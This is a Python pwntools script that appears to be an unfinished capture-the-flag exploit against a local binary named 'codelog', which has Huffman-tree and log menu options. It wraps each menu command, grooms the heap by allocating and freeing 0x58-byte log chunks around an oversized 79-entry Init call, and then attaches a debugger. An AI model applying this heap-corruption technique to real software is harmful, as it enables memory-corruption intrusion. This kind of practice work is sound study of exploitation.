from pwn import *
p=process('./codelog')
'''
Encode
Decode
Show_code
Show_tree
Add_log
Delete_log
Print_log
Exit
'''
context.log_level='debug'
def opt(opt):
    p.sendlineafter(b'$ ',opt)
def Encode(length,item):
    p.sendlineafter(b'$ ',b'Encode')
    p.sendlineafter(b'The length of input: \n',str(length).encode())
    p.sendlineafter(b'Input: ',item)
def Decode():
    p.sendlineafter(b'$ ',b'Decode')
def Show_code():
    p.sendlineafter(b'$ ',b'Show_code')
def Delete_log(idx):
    p.sendlineafter(b'$ ',b'Delete_log')
    p.sendlineafter(b'idx: ',str(idx).encode())

def Show_tree():
    p.sendlineafter(b'$ ',b'Show_tree')
def Add_log(size,log):
    p.sendlineafter(b'$ ',b'Add_log')
    p.sendlineafter(b'size: ',str(size).encode())
    p.sendlineafter(b'log: ',log)
def Print_log(idx):
    p.sendlineafter(b'$ ',b'Print_log')
    p.sendlineafter(b'idx: ',str(idx).encode())
def Init(size,list):
    p.sendlineafter(b'$ ',b'Init')
    p.sendlineafter(b'Size: ',str(size).encode())
    for i in range(size):
        p.sendlineafter(b'char: ',list[i][0].encode())
        p.sendlineafter(b'weight: ',str(list[i][1]).encode())
    
# # opt(b'Show_code')
list1=[
    ['e',10],
    ['f',30],
    ['g',44],
    ['h',20],
    ['j',5],
    ]
list2=[
    ['s',11],
    ['d',22],
    ['f',33],
    ['q',44],
    ['z',55],
    ]
list79=[
    ['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],
    ['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],
    ['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],
    ['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],
    ['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],
    ['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],
    ['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],
    ['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],['s',11],
    ]
# gdb.attach(p)
# pause()
for i in range(8):
    Add_log(0x58,str(i).encode()*0x58)
# Init(79,list79)
Init(79,list79)
# Init(79,list79)
# Init(79,list79)
# Init(6,list79)
# Init(6,list79)
for i in range(8):
    Delete_log(i)
for i in range(7):
    Add_log(0x58,str(i).encode()*0x58)
# Init(5,list1)
# Encode(7,b'efgggpggg')
# Show_code()
# Show_tree()
# # p.interactive()
# Add_log(0x58,b'e'*0x58)
# Add_log(0x58,b't'*0x58)
# Add_log(0x58,b'i'*0x58)
# Add_log(0x58,b'k'*0x58)
# gdb.attach(p)
# pause()
# Delete_log(0)
# Delete_log(1)
# Delete_log(2)
# Add_log(0x58,b'')
# Print_log(0)
# Add_log(0x58,b'i'*0x58)
# Delete_log(0)
# Add_log(80,b'ddddd')
# Add_log(272,b'esgrjbhkhskuerkhusgrkehkhserkjgkjsregsergsresrg')
# Add_log(272,b'esgrjbhkhskuerkhusgrkehkhserkjgkjsregsergsresrg')
# Add_log(272,b'esgrjbhkhskuerkhusgrkehkhserkjgkjsregsergsresrg')
# Add_log(272,b'esgrjbhkhskuerkhusgrkehkhserkjgkjsregsergsresrg')
# Add_log(272,b'esgrjbhkhskuerkhusgrkehkhserkjgkjsregsergsresrg')
# Add_log(272,b'esgrjbhkhskuerkhusgrkehkhserkjgkjsregsergsresrg')
# Add_log(272,b'esgrjbhkhskuerkhusgrkehkhserkjgkjsregsergsresrg')
# Delete_log(0)
# Add_log(80,b'ttttttttttttteeeeee')
# Delete_log(0)
# Add_log(80,b'wrrer')
# Print_log(0)
# Print_log(0)
# # Encode(3,b'sdf')
# Show_tree()
# Show_code()
# Decode()
gdb.attach(p)
pause()
p.interactive()
# size=9
# print(str(size).encode())